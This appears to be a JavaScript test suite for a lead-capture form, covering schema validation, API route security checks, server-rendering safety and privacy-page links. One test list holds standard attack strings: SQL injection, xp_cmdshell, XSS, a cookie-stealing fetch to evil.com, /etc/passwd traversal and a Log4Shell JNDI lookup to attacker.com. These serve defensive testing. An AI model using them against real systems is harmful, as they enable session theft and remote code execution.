import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { leadSchema } from '../lib/lead-validation.ts';

console.log('======================================================================');
console.log('   CHALLENGER_M4_2: EMPIRICAL ADVERSARIAL STRESS TEST SUITE          ');
console.log('   (Form Validation, Route Schemas, Component SSR, Security & DPDP)  ');
console.log('======================================================================');

// -----------------------------------------------------------------------------
// [SECTION 1] FORM VALIDATION STRESS TEST: IntentLeadForm & leadSchema
// -----------------------------------------------------------------------------
console.log('\n[SECTION 1] FORM VALIDATION STRESS TEST (leadSchema in lib/lead-validation.ts)');

const validBaseLead = {
  id: '550e8400-e29b-41d4-a716-446655440000',
  name: 'Prof. Arvind Sharma',
  email: 'arvind.sharma@institution.ac.in',
  phone: '+91 98765 43210',
  organization: 'National Institute of Technology',
  organization_type: 'college',
  designation: 'Head of Training & Placement',
  interest: 'college',
  message: 'Requesting placement readiness audit for 2027 batch.',
  audience: 'colleges',
  campaign_id: 'college-audit',
  campaign_name: 'Placement Readiness 2027',
  source: '/colleges/request-demo',
  landing_page: 'https://pathwisse.com/colleges/request-demo',
  referrer: 'https://google.com',
  utm_source: 'google',
  utm_medium: 'cpc',
  utm_campaign: 'campus-2027',
  utm_term: 'placement readiness software',
  utm_content: 'banner-a',
  consent: true,
};

// 1.1 Baseline Valid Lead
{
  const res = leadSchema.safeParse(validBaseLead);
  assert.ok(res.success, 'Valid baseline lead should pass validation');
  console.log('  ✓ Baseline valid college lead parses successfully');
}

// 1.2 Enterprise Valid Lead
{
  const enterpriseLead = {
    ...validBaseLead,
    id: 'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11',
    name: 'Sarah Jenkins',
    email: 'sarah.j@techcorp.io',
    organization: 'TechCorp Solutions',
    organization_type: 'enterprise',
    designation: 'VP of Engineering',
    interest: 'upskilling',
    audience: 'enterprise',
  };
  const res = leadSchema.safeParse(enterpriseLead);
  assert.ok(res.success, 'Valid enterprise lead should pass validation');
  console.log('  ✓ Baseline valid enterprise lead parses successfully');
}

// 1.3 Missing / Invalid UUID
console.log('\n  --- Testing ID (UUID) Validation ---');
for (const invalidId of ['', 'not-a-uuid', '12345', '550e8400-e29b-41d4-a716-zzzzzzzzzzzz', "' OR 1=1; --"]) {
  const res = leadSchema.safeParse({ ...validBaseLead, id: invalidId });
  assert.ok(!res.success, `Schema must reject invalid UUID: "${invalidId}"`);
  assert.ok(res.error.issues.some((i) => i.path.includes('id')));
}
console.log('  ✓ Schema strictly rejects non-UUID IDs (prevents arbitrary ID injections)');

// 1.4 Name Boundary & Edge Cases
console.log('\n  --- Testing Name Field Boundaries & Sanitization ---');
{
  // Empty name
  const emptyRes = leadSchema.safeParse({ ...validBaseLead, name: '' });
  assert.ok(!emptyRes.success, 'Empty name must fail min(1)');

  // Whitespace-only name (trimmed to empty)
  const wsRes = leadSchema.safeParse({ ...validBaseLead, name: '     ' });
  assert.ok(!wsRes.success, 'Whitespace-only name must be trimmed and fail min(1)');

  // Exactly 1 char (valid)
  const minRes = leadSchema.safeParse({ ...validBaseLead, name: 'A' });
  assert.ok(minRes.success, '1-character name must be valid');
  assert.equal(minRes.data.name, 'A');

  // Exactly 100 chars (valid)
  const name100 = 'A'.repeat(100);
  const maxRes = leadSchema.safeParse({ ...validBaseLead, name: name100 });
  assert.ok(maxRes.success, '100-character name must be valid');

  // 101 chars (invalid)
  const name101 = 'A'.repeat(101);
  const overRes = leadSchema.safeParse({ ...validBaseLead, name: name101 });
  assert.ok(!overRes.success, '101-character name must exceed max(100)');
  assert.ok(overRes.error.issues.some((i) => i.path.includes('name')));
}
console.log('  ✓ Name boundaries verified: min(1), whitespace trimming, max(100) strictly enforced');

// 1.5 Email RFC Validation & Lowercasing Transform
console.log('\n  --- Testing Email Formatting & Transformation ---');
const invalidEmails = [
  '',
  '   ',
  'plainaddress',
  '@missingusername.com',
  'username@.com',
  'username@domain..com',
  'user name@domain.com',
  'A'.repeat(250) + '@example.com', // Exceeds 254 chars
];
for (const em of invalidEmails) {
  const res = leadSchema.safeParse({ ...validBaseLead, email: em });
  assert.ok(!res.success, `Schema must reject invalid email: "${em}"`);
  assert.ok(res.error.issues.some((i) => i.path.includes('email')));
}

// Uppercase transform verification
{
  const upperRes = leadSchema.safeParse({
    ...validBaseLead,
    email: '  JOHN.DOE@STANFORD.EDU  ',
  });
  assert.ok(upperRes.success, 'Valid email with mixed-case and padding should parse');
  assert.equal(
    upperRes.data.email,
    'john.doe@stanford.edu',
    'Email must be trimmed and lowercased automatically'
  );
}
console.log('  ✓ Email validation rejects malformed addresses and normalizes to lowercased trimmed format');

// 1.6 Institutional Organization Requirement (superRefine)
console.log('\n  --- Testing Organization Requirement for Institutional Interests ---');
for (const instInterest of ['college', 'upskilling', 'hiring']) {
  // Empty organization
  const resEmpty = leadSchema.safeParse({
    ...validBaseLead,
    interest: instInterest,
    organization: '',
  });
  assert.ok(!resEmpty.success, `Organization must be required for ${instInterest}`);
  assert.ok(
    resEmpty.error.issues.some(
      (i) => i.path.includes('organization') && i.message === 'Organization is required.'
    ),
    `Must include exact error message "Organization is required." for ${instInterest}`
  );

  // Whitespace-only organization
  const resWs = leadSchema.safeParse({
    ...validBaseLead,
    interest: instInterest,
    organization: '    ',
  });
  assert.ok(!resWs.success, `Whitespace organization must fail for ${instInterest}`);
}

// Student interest should allow empty organization
{
  const resStudent = leadSchema.safeParse({
    ...validBaseLead,
    interest: 'student',
    organization: '',
  });
  assert.ok(resStudent.success, 'Student interest should not require organization');
  assert.equal(resStudent.data.organization, '');
}
console.log('  ✓ Institutional interest refinement verified: organization required for college/upskilling/hiring');

// 1.7 Honeypot Bot Trap (Anti-Spam)
console.log('\n  --- Testing Honeypot (website field) ---');
{
  // Bot fills out website
  const botLead = {
    ...validBaseLead,
    website: 'https://automated-spam-bot.xyz',
  };
  const resBot = leadSchema.safeParse(botLead);
  assert.ok(!resBot.success, 'Honeypot field must trigger rejection');
  assert.ok(
    resBot.error.issues.some(
      (i) => i.path.includes('website') && i.message === 'Unable to accept this enquiry.'
    ),
    'Honeypot rejection must return custom issue "Unable to accept this enquiry."'
  );

  // Normal human user leaves website empty or omitted
  const humanLead = { ...validBaseLead, website: '' };
  const resHuman = leadSchema.safeParse(humanLead);
  assert.ok(resHuman.success, 'Empty website field must pass validation');
}
console.log('  ✓ Honeypot trap verified: rejects submissions with non-empty website');

// 1.8 Consent Literal Boolean Verification
console.log('\n  --- Testing Consent Enforcement ---');
for (const invalidConsent of [false, undefined, null, 'true', 1, 0]) {
  const res = leadSchema.safeParse({ ...validBaseLead, consent: invalidConsent });
  assert.ok(!res.success, `Consent must reject ${invalidConsent}`);
  assert.ok(res.error.issues.some((i) => i.path.includes('consent')));
}
console.log('  ✓ Consent strictly requires literal boolean `true`');

// 1.9 Malicious Attack Vectors: SQL Injection, XSS, and Boundary Strings
console.log('\n  --- Testing SQL Injection & XSS Attack Vectors ---');
const attackVectors = [
  "' OR '1'='1",
  "'; DROP TABLE leads; --",
  "admin' --",
  "1; EXEC xp_cmdshell('dir'); --",
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:fetch('https://evil.com/'+document.cookie)",
  "../../../../etc/passwd",
  "{{7*7}}",
  "${jndi:ldap://attacker.com/exploit}",
];

for (const vector of attackVectors) {
  // Test injection in name (should be accepted as string if within 100 chars, but safely handled by prepared statements)
  const nameInj = leadSchema.safeParse({ ...validBaseLead, name: vector.slice(0, 100) });
  assert.ok(nameInj.success, `Schema parses vector safely as text: "${vector.slice(0, 30)}..."`);

  // Test injection in organization
  const orgInj = leadSchema.safeParse({ ...validBaseLead, organization: vector.slice(0, 160) });
  assert.ok(orgInj.success, 'Organization parses vector safely as text');

  // Test injection in message
  const msgInj = leadSchema.safeParse({ ...validBaseLead, message: vector.repeat(10).slice(0, 2000) });
  assert.ok(msgInj.success, 'Message parses vector safely as text');
}

// Long overflow vectors (DoS protection)
{
  const dosName = 'A'.repeat(10000);
  const resDosName = leadSchema.safeParse({ ...validBaseLead, name: dosName });
  assert.ok(!resDosName.success, '10,000 char name must be rejected cleanly');

  const dosMsg = 'A'.repeat(50000);
  const resDosMsg = leadSchema.safeParse({ ...validBaseLead, message: dosMsg });
  assert.ok(!resDosMsg.success, '50,000 char message must be rejected cleanly');

  const dosPhone = '1'.repeat(500);
  const resDosPhone = leadSchema.safeParse({ ...validBaseLead, phone: dosPhone });
  assert.ok(!resDosPhone.success, '500 char phone must be rejected cleanly');
}
console.log('  ✓ Attack vectors and length overflows handled cleanly by Zod constraints without ReDoS or memory crash');


// -----------------------------------------------------------------------------
// [SECTION 2] ROUTE HANDLER & SECURITY ARCHITECTURE: POST /api/leads
// -----------------------------------------------------------------------------
console.log('\n[SECTION 2] ROUTE HANDLER & SECURITY ARCHITECTURE: POST /api/leads');

const routeContent = readFileSync(new URL('../app/api/leads/route.ts', import.meta.url), 'utf8');
const rawDbContent = readFileSync(new URL('../db/raw.ts', import.meta.url), 'utf8');

// 2.1 Origin Validation
console.log('\n  --- Checking Origin Security Guard (allowedOrigin) ---');
assert.match(
  routeContent,
  /if\(!allowedOrigin\(request\)\)return Response\.json\(\{error:'Request origin is not allowed\.'\},\{status:403\}\);/,
  'Route must check allowedOrigin and return 403 on untrusted origin'
);
assert.match(
  rawDbContent,
  /export function allowedOrigin\(request:Request\)\{const origin=request\.headers\.get\('origin'\);if\(!origin\)return true;return trustedOrigins\.includes\(origin\)\|\|origin===new URL\(request\.url\)\.origin;\}/,
  'allowedOrigin must validate against trustedOrigins and same-origin'
);
console.log('  ✓ Origin validation: Blocks cross-site forgery with 403 response');

// 2.2 Payload Size Limit (smallJson)
console.log('\n  --- Checking Request Size Limit (smallJson) ---');
assert.match(
  rawDbContent,
  /if\(Number\(request\.headers\.get\('content-length'\)\|\|0\)>12000\)throw new Error\('Payload too large'\);/,
  'smallJson must guard content-length > 12000'
);
assert.match(
  rawDbContent,
  /if\(text\.length>12000\)throw new Error\('Payload too large'\);/,
  'smallJson must guard body text length > 12000'
);
assert.match(
  routeContent,
  /catch\{return Response\.json\(\{error:'Please send a valid, smaller enquiry\.'\},\{status:400\}\)\}/,
  'Route must return 400 with smaller enquiry error if payload exceeds limit'
);
console.log('  ✓ Payload size limit: 12KB cap strictly enforced against buffer exhaustion attacks');

// 2.3 SQL Prepared Statements & Parameter Binding
console.log('\n  --- Checking SQL Prepared Statements & Parameter Binding ---');
assert.match(
  routeContent,
  /INSERT INTO leads \(id,name,email,phone,organization,organization_type,designation,interest,message,audience,campaign_id,campaign_name,source,landing_page,referrer,utm_source,utm_medium,utm_campaign,utm_term,utm_content,attribution,consent,lead_status,lead_score,owner,crm_sync_status\) VALUES \(\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?,\?\) ON CONFLICT\(id\) DO NOTHING/,
  'Route must use parameterized SQL with 26 ? placeholders and ON CONFLICT(id) DO NOTHING'
);
assert.doesNotMatch(
  routeContent,
  /`INSERT INTO leads.*?\$\{/,
  'Route must NEVER use string interpolation for SQL queries'
);
console.log('  ✓ SQL Injection Immunity: 100% parameterized bindings with zero string interpolation');

// 2.4 Rate Limiting Logic (1 Hour Window, 5 Submissions Cap)
console.log('\n  --- Checking Rate Limiting Implementation ---');
assert.match(
  routeContent,
  /SELECT COUNT\(\*\) AS count FROM leads WHERE email = \? AND created_at > datetime\('now', '-1 hour'\)/,
  'Route must query lead submission count per email within 1 hour'
);
assert.match(
  routeContent,
  /if\(rate&&rate\.count>=5\)return Response\.json\(\{error:'You have already sent several enquiries\. Please try again later\.'\},\{status:429\}\);/,
  'Route must return 429 when submissions >= 5 within 1 hour'
);
console.log('  ✓ Rate Limiting: 5 submissions/hour/email window enforced with status 429');

// 2.5 Idempotent Submission (Duplicate ID Check)
console.log('\n  --- Checking Idempotency ---');
assert.match(
  routeContent,
  /const existing=await db\.prepare\('SELECT id FROM leads WHERE id = \?'\)\.bind\(p\.id\)\.first\(\);if\(existing\)return Response\.json\(\{ok:true\}\);/,
  'Route must deduplicate by UUID id and return 200 {ok: true} without double-processing'
);
console.log('  ✓ Idempotency: Re-submitting the same lead UUID returns {ok: true} without duplication');

// 2.6 Cache-Control: no-store Header
console.log('\n  --- Checking HTTP Caching Directives ---');
assert.match(
  routeContent,
  /headers:\{'Cache-Control':'no-store'\}/,
  'Route must return Cache-Control: no-store on lead submission'
);
console.log('  ✓ Sensitive response caching disabled via Cache-Control: no-store');


// -----------------------------------------------------------------------------
// [SECTION 3] COMPONENT MOUNTING & SSR SAFETY
// -----------------------------------------------------------------------------
console.log('\n[SECTION 3] COMPONENT MOUNTING & SSR SAFETY (Hairline Figures & Pages)');

const hairlineContent = readFileSync(new URL('../components/ui/hairline-figure.tsx', import.meta.url), 'utf8');
const collegesContent = readFileSync(new URL('../app/colleges/page.tsx', import.meta.url), 'utf8');
const enterpriseContent = readFileSync(new URL('../app/enterprise/page.tsx', import.meta.url), 'utf8');
const leadFormContent = readFileSync(new URL('../components/forms/IntentLeadForm.tsx', import.meta.url), 'utf8');

// 3.1 HairlineFigure Hydration Safeguards
console.log('\n  --- Auditing HairlineFigure Client Mounting Safeguards ---');
assert.match(hairlineContent, /^'use client';/m, 'HairlineFigure must be client-only');
assert.match(hairlineContent, /const \[mounted, setMounted\] = useState\(false\);/, 'Must track mounted state starting as false');
assert.match(hairlineContent, /useEffect\(\(\) => \{\s*setMounted\(true\);\s*\}, \[\]\);/, 'Must flip mounted state inside useEffect');
assert.match(
  hairlineContent,
  /\{mounted \? \(\s*<Component[\s\S]*?\) : \(\s*<div[\s\S]*?animate-spin[\s\S]*?\)\}/,
  'Must render deterministic fallback loader during SSR to prevent hydration mismatches'
);
console.log('  ✓ HairlineFigure implements two-phase mounting: deterministic server skeleton + client-only WebGL canvas');

// 3.2 FIGURE_MAP Exhaustive Coverage
console.log('\n  --- Auditing Hairline FIGURE_MAP Registrations ---');
const expectedCollegeFigures = ['plot', 'loupe', 'branches', 'sieve'];
const expectedEnterpriseFigures = ['exploded', 'terminal', 'vault', 'keyboard', 'sieve', 'branches'];

for (const fig of expectedCollegeFigures) {
  assert.match(
    hairlineContent,
    new RegExp(`${fig}:\\s*[A-Z]`),
    `FIGURE_MAP must include college figure "${fig}"`
  );
  assert.match(
    collegesContent,
    new RegExp(`figure=['"]${fig}['"]|figure:\\s*['"]${fig}['"]`),
    `Colleges page must reference valid figure "${fig}"`
  );
  console.log(`  ✓ College figure "${fig}" confirmed in FIGURE_MAP and page`);
}

for (const fig of expectedEnterpriseFigures) {
  assert.match(
    hairlineContent,
    new RegExp(`${fig}:\\s*[A-Z]`),
    `FIGURE_MAP must include enterprise figure "${fig}"`
  );
  assert.match(
    enterpriseContent,
    new RegExp(`figure=['"]${fig}['"]|figure:\\s*['"]${fig}['"]`),
    `Enterprise page must reference valid figure "${fig}"`
  );
  console.log(`  ✓ Enterprise figure "${fig}" confirmed in FIGURE_MAP and page`);
}

// 3.3 SSR Safety in Server Components
console.log('\n  --- Auditing Server Component Browser Global Safety ---');
// app/colleges/page.tsx should NOT contain window, document, or localStorage API accesses
assert.doesNotMatch(
  collegesContent,
  /\bwindow\.[a-zA-Z]|\bdocument\.[a-zA-Z]|\blocalStorage\.[a-zA-Z]/,
  'app/colleges/page.tsx must not access window, document, or localStorage APIs'
);
console.log('  ✓ app/colleges/page.tsx is a clean Server Component with zero unshielded browser globals');

// app/enterprise/page.tsx should NOT contain window, document, or localStorage API accesses
assert.doesNotMatch(
  enterpriseContent,
  /\bwindow\.[a-zA-Z]|\bdocument\.[a-zA-Z]|\blocalStorage\.[a-zA-Z]/,
  'app/enterprise/page.tsx must not access window, document, or localStorage APIs'
);
console.log('  ✓ app/enterprise/page.tsx is a clean Server Component with zero unshielded browser globals');

// IntentLeadForm should guard browser globals
assert.match(
  leadFormContent,
  /typeof window !== 'undefined'/,
  'IntentLeadForm must guard window access'
);
assert.match(
  leadFormContent,
  /typeof document !== 'undefined'/,
  'IntentLeadForm must guard document access'
);
console.log('  ✓ IntentLeadForm safely shields all window and document references behind typeof checks');


// -----------------------------------------------------------------------------
// [SECTION 4] TRUST & COMPLIANCE LINKS AND DPDP VERIFICATION
// -----------------------------------------------------------------------------
console.log('\n[SECTION 4] TRUST & COMPLIANCE LINKS AND DPDP ALIGNMENT');

const contentIndex = readFileSync(new URL('../content/index.ts', import.meta.url), 'utf8');

// 4.1 Route Existence in content/index.ts
console.log('\n  --- Checking Trust Routes Registration ---');
const trustRoutes = [
  'trust/security',
  'trust/privacy',
  'trust/dpdp',
  'trust/compliance',
  'trust/terms',
];

for (const route of trustRoutes) {
  assert.match(
    contentIndex,
    new RegExp(`\\[\\s*['"]${route}['"]`),
    `Route "${route}" must be registered in content/index.ts`
  );
  assert.match(
    contentIndex,
    new RegExp(`pages\\['${route}'\\]`),
    `Route "${route}" must have metadata assigned in pages['${route}']`
  );
  console.log(`  ✓ Route "/${route}" is registered and populated`);
}

// 4.2 Verifying Exact Copy in Trust Pages
console.log('\n  --- Verifying Trust Content Accuracy ---');
assert.match(contentIndex, /Security principles for public website and lead-generation systems/i, 'trust/security description verified');
assert.match(contentIndex, /Pathwisse privacy notice for website visitors, leads, students/i, 'trust/privacy description verified');
assert.match(contentIndex, /India DPDP-oriented privacy and consent principles/i, 'trust/dpdp description verified');
console.log('  ✓ Trust pages define explicit security posture, privacy notice, and Indian DPDP alignment');

// 4.3 Verifying Links in Colleges & Enterprise Pages
console.log('\n  --- Auditing Links from Colleges, Enterprise & Lead Forms ---');
assert.match(enterpriseContent, /href="\/trust\/security"/, 'Enterprise page must link to /trust/security');
assert.match(enterpriseContent, /href="\/trust\/privacy"/, 'Enterprise page must link to /trust/privacy');
assert.match(enterpriseContent, /href="\/trust\/dpdp"/, 'Enterprise page must link to /trust/dpdp');
assert.match(leadFormContent, /href="\/trust\/privacy"/, 'IntentLeadForm consent checkbox must link to /trust/privacy');

// Verify zero dead '#' anchors in colleges and enterprise
assert.doesNotMatch(collegesContent, /href="#"/, 'Colleges page must not contain dead "#" hrefs');
assert.doesNotMatch(enterpriseContent, /href="#"/, 'Enterprise page must not contain dead "#" hrefs');
assert.doesNotMatch(leadFormContent, /href="#"/, 'IntentLeadForm must not contain dead "#" hrefs');
console.log('  ✓ All trust & compliance links resolve to valid registered paths with 0 dead anchors');

console.log('\n======================================================================');
console.log('   ALL CHALLENGER_M4_2 ADVERSARIAL STRESS TESTS PASSED (100%)         ');
console.log('======================================================================\n');
